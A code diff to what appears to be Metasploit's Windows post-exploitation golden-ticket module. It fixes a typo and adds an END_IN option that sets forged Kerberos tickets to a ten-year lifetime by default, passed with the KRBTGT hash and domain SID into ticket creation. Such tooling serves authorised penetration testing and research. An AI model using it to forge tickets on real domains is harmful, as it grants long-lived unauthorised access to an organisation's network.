@@ -1,4 +1,8 @@
-require 'msf/core'
+##
+# This module requires Metasploit: https://metasploit.com/download
+# Current source: https://github.com/rapid7/metasploit-framework
+##
+
 require 'msf/core/post/windows/netapi'
 require 'msf/core/post/windows/kiwi'
 require 'msf/core/post/windows/error'
@@ -39,8 +43,9 @@ class MetasploitModule < Msf::Post
         OptString.new('KRBTGT_HASH', [false, 'KRBTGT NTLM Hash']),
         OptString.new('Domain SID', [false, 'Domain SID']),
         OptInt.new('ID', [false, 'Target User ID']),
-        OptString.new('GROUPS', [false, 'ID of Groups (Comma Seperated)'])
-      ], self.class)
+        OptString.new('GROUPS', [false, 'ID of Groups (Comma Separated)']),
+        OptInt.new('END_IN', [true, 'End in ... Duration in hours, default 10 YEARS (~87608 hours)', 87608])
+      ])
   end
 
   def run
@@ -51,6 +56,7 @@ class MetasploitModule < Msf::Post
     krbtgt_hash = datastore['KRBTGT_HASH']
     domain_sid = datastore['SID']
     id = datastore['ID'] || 0
+    end_in = datastore['END_IN'] || 87608
 
     unless domain
       print_status('Searching for the domain...')
@@ -106,7 +112,8 @@ class MetasploitModule < Msf::Post
       domain_sid:  domain_sid,
       krbtgt_hash: krbtgt_hash,
       id:          id,
-      group_ids:   datastore['GROUPS']
+      group_ids:   datastore['GROUPS'],
+      end_in:     end_in
     })
 
     if ticket
